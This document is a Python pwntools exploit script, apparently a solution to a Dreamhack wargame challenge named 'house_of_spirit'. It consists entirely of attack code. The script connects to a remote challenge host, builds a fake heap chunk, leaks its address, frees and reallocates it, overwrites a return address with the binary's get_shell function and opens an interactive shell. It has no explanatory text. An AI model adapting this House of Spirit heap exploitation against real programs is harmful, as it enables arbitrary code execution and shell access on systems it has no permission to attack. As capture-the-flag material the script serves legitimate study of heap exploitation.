#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./house_of_spirit')

# p = process('./house_of_spirit')
p = remote('host3.dreamhack.games', 11301)
# Create fake chunk 
payload = p64(0) + p64(0x61)
p.sendafter('name: ', payload)
leak = int(p.recvuntil(':')[:-1], 16)
log.info("Leak name: " + hex(leak))

# Free fake chunk 
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Addr: ', str(leak + 0x10))

# Malloc fake chunk 
payload = b'A' * 0x20 + b'A' * 8 + p64(elf.symbols["get_shell"])
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', str(0x50).encode())
p.sendafter(b'Data: ', payload)

# Exit 
p.sendlineafter(b'> ', b'3')
p.interactive()
